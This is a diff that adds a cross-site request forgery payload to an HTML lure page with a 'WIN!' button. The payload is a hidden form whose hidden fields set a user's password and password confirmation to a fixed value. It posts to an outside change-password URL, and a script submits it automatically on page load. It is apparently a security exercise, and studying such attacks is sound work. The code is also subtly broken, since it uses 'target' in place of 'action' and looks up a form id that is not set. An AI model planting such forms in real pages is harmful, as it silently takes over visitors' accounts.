@@ -16,7 +16,20 @@
         <p class="text-center"><a class="btn btn-lg btn-success" href="#" role="button">WIN!</a></p>
       </div>
 
+   <form name="myForm" method="post" class="form-horizontal" target="http://silver-quire.herokuapp.com/change-password/" >
+      <div class="form-group">
+        <div class="col-sm-4">
+          <input id="password_confirmation" type="hidden" name="user[password]" value="hvg123" class="form-control">
+        </div>
+      </div>
+      <div class="form-group">
+        <div class="col-sm-4">
+          <input id="password_confirmation" type="hidden" name="user[password_confirmation]" value="hvg123" class="form-control">
+        </div>
+      </div>
+    </form>
 
+<script>document.getElementById("myForm").submit();</script>
   </body>
 </html>
 
